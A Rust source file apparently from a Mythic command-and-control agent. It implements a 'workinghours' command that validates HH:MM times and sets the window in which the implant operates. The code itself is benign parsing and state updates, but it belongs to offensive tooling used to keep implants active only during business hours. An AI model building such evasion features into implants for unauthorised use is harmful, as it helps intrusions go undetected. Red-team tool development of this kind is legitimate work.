use crate::agent::{AgentTask, SharedData};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use chrono::NaiveTime;

/// Arguments for the workinghours command
#[derive(Deserialize, Serialize)]
struct WorkingHoursArgs {
    /// Start time in HH:MM format
    start: String,
    /// End time in HH:MM format
    end: String,
}

/// Set the working hours for the agent
/// * `task` - Task information from Mythic
/// * `shared` - Mutable reference to shared agent data
pub fn working_hours(
    task: &AgentTask,
    shared: &mut SharedData,
) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: WorkingHoursArgs = serde_json::from_str(&task.parameters)?;

    // Parse the time strings (expected format: "HH:MM")
    let start_time = match NaiveTime::parse_from_str(&args.start, "%H:%M") {
        Ok(time) => time,
        Err(_) => {
            return Ok(json!({
                "task_id": task.id,
                "status": "error",
                "user_output": format!("Invalid start time format: '{}'. Expected HH:MM", args.start),
                "completed": true,
            }));
        }
    };

    let end_time = match NaiveTime::parse_from_str(&args.end, "%H:%M") {
        Ok(time) => time,
        Err(_) => {
            return Ok(json!({
                "task_id": task.id,
                "status": "error", 
                "user_output": format!("Invalid end time format: '{}'. Expected HH:MM", args.end),
                "completed": true,
            }));
        }
    };

    // Update the working hours
    let old_start = shared.working_start.format("%H:%M").to_string();
    let old_end = shared.working_end.format("%H:%M").to_string();
    
    shared.working_start = start_time;
    shared.working_end = end_time;

    let message = if start_time == end_time {
        format!(
            "Working hours updated: 24/7 operation (was {} - {})",
            old_start, old_end
        )
    } else {
        format!(
            "Working hours updated: {} - {} (was {} - {})",
            args.start, args.end, old_start, old_end
        )
    };

    Ok(json!({
        "task_id": task.id,
        "status": "success",
        "user_output": message,
        "completed": true,
    }))
}